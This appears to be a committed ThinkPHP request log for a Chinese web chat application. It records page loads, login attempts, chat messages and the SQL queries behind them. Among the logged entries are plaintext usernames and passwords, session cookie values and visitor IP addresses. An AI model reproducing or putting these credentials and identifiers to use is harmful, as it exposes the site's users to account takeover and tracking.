+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T15:04:05+08:00 ] 0.0.0.0 113.116.199.243 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.033426s][吞吐率：29.92req/s] [内存消耗：1,854.84kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=8lp01rifb3kk1qj5hkrjohlhe1',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T15:23:23+08:00 ] 0.0.0.0 223.74.200.92 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.045148s][吞吐率：22.15req/s] [内存消耗：2,495.24kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SM-N9300 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36',
+  'referer' => 'http://www.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T15:23:28+08:00 ] 0.0.0.0 223.74.200.92 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.033372s][吞吐率：29.97req/s] [内存消耗：1,855.16kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SM-N9300 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=ikdhsf5o4qfpp6asp2suk46rm1',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T16:13:15+08:00 ] 0.0.0.0 1.81.252.190 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.436861s][吞吐率：2.29req/s] [内存消耗：2,495.06kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.3226.400 QQBrowser/9.6.11682.400',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T16:13:18+08:00 ] 0.0.0.0 1.81.252.190 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.042735s][吞吐率：23.40req/s] [内存消耗：1,854.91kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.3226.400 QQBrowser/9.6.11682.400',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=5e4t63qcqs2192lcnnc55b4q10',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T16:13:20+08:00 ] 0.0.0.0 1.81.252.190 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.286638s][吞吐率：3.49req/s] [内存消耗：3,428.72kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '21',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.3226.400 QQBrowser/9.6.11682.400',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=5e4t63qcqs2192lcnnc55b4q10',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => '8',
+  'password' => '8',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001976s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.004912s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = '8' LIMIT 1 [ RunTime:0.000770s ]
+[ error ] [2]MemcachePool::get(): Invalid key[C:\web\eddchat_wrkb2y\web\thinkphp\library\think\cache\driver\Memcache.php:66]
+---------------------------------------------------------------
+[ 2017-07-30T16:16:25+08:00 ] 0.0.0.0 110.188.255.184 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.449093s][吞吐率：2.23req/s] [内存消耗：3,554.77kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=21mjc3995388v4d4l6n4ocmqd0; CUID=5viWV',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001161s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006926s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.019464s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000760s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000799s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000584s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000873s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000668s ]
+---------------------------------------------------------------
+[ 2017-07-30T16:16:25+08:00 ] 0.0.0.0 110.188.255.184 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.223854s][吞吐率：4.47req/s] [内存消耗：3,425.61kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '48',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=21mjc3995388v4d4l6n4ocmqd0; CUID=frI35',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa00000000b',
+  'client_name' => 'admin',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.009838s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006582s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000756s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'admin' [ RunTime:0.000637s ]
+---------------------------------------------------------------
+[ 2017-07-30T16:16:34+08:00 ] 0.0.0.0 110.188.255.184 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.259301s][吞吐率：3.86req/s] [内存消耗：3,434.16kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '47',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=21mjc3995388v4d4l6n4ocmqd0; CUID=YqpQv',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'admin',
+  'msg' => '信息',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.009666s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006006s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000715s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'admin' [ RunTime:0.000639s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005428s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501402594' , 1 , 0 , '信息') [ RunTime:0.000624s ]
+---------------------------------------------------------------
+[ 2017-07-30T16:16:40+08:00 ] 0.0.0.0 110.188.255.184 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.231680s][吞吐率：4.32req/s] [内存消耗：3,434.27kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '74',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=21mjc3995388v4d4l6n4ocmqd0; CUID=aEp2X',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'admin',
+  'msg' => '地对地导弹',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.016320s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006310s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000726s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'admin' [ RunTime:0.000580s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.006308s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501402600' , 1 , 0 , '地对地导弹') [ RunTime:0.000505s ]
+---------------------------------------------------------------
+[ 2017-07-30T16:32:13+08:00 ] 0.0.0.0 140.205.204.75 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.237175s][吞吐率：4.22req/s] [内存消耗：2,493.51kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'en',
+  'accept-encoding' => 'gzip,deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T17:30:29+08:00 ] 0.0.0.0 203.208.60.215 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.468491s][吞吐率：2.13req/s] [内存消耗：1,853.63kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Googlebot-Image/1.0',
+  'host' => 'eddchat.oumaikeji.com',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept-encoding' => 'gzip,deflate,br',
+  'accept' => '*/*',
+  'connection' => 'Keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T19:14:43+08:00 ] 0.0.0.0 61.242.61.60 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.384880s][吞吐率：2.60req/s] [内存消耗：2,494.76kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T19:14:46+08:00 ] 0.0.0.0 61.242.61.60 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.061905s][吞吐率：16.15req/s] [内存消耗：1,854.82kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T19:15:01+08:00 ] 0.0.0.0 61.242.61.60 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.251118s][吞吐率：3.98req/s] [内存消耗：3,540.23kb] [文件加载：64]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '35',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client2',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002073s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005896s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client2' LIMIT 1 [ RunTime:0.000795s ]
+[ sql ] [ SQL ] UPDATE `edd_users`  SET `last_login_time`='1501413301',`last_login_ip`='61.242.61.60',`user_hits`=1  WHERE  `id` = 56 [ RunTime:0.017771s ]
+---------------------------------------------------------------
+[ 2017-07-30T19:15:02+08:00 ] 0.0.0.0 61.242.61.60 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.251518s][吞吐率：3.98req/s] [内存消耗：3,561.16kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
